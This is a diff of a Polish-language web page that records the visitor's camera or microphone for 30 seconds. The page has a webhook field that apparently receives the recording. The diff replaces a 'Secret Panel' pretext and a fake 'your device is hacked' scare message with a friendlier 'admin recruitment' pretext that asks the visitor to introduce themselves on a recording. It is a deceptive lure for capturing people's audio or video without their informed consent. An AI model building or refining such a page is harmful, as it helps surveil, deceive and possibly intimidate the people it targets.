@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Secret</title>
+<title>Rekrutacja na Admina</title>
 <style>
   body{font-family:Arial,Helvetica,sans-serif;background:#f5f7fb;color:#111;padding:20px}
   .card{max-width:820px;margin:0 auto;background:#fff;padding:18px;border-radius:10px;box-shadow:0 8px 30px rgba(0,0,0,0.08)}
@@ -20,8 +20,8 @@
 </head>
 <body>
   <div class="card">
-    <h1>Secret Panel</h1>
-    <p>kliknij start aby uzyskać dostęp do panelu admina. Wyraź zgodę na dostęp od przeglądarki (kwestie bezpieczeństwa).</p>
+    <h1>Rekrutacja na admina</h1>
+    <p>kliknij start aby wziąć udział w rekrutacji. trwa ona 30 sekund. jedyne co musisz zrobić to przedstawić się i opisać siebię na nagraniu</p>
 
     <label>Webhook:</label>
     <input id="webhook" type="text" 
@@ -90,7 +90,7 @@
     };
 
     recorder.start();
-    show(status,'URZĄDZENIE SCHAKOWANE WYJŚCIE ZE STRONY = WYŁĄCZENIE URzĄDZENIA! PROSZĘ CZEKAĆ DO KOŃCA PROCESU!!!');
+    show(status,'nagrywanie...');
     setTimeout(()=>{ recorder.stop(); },30000);
   };
 })();
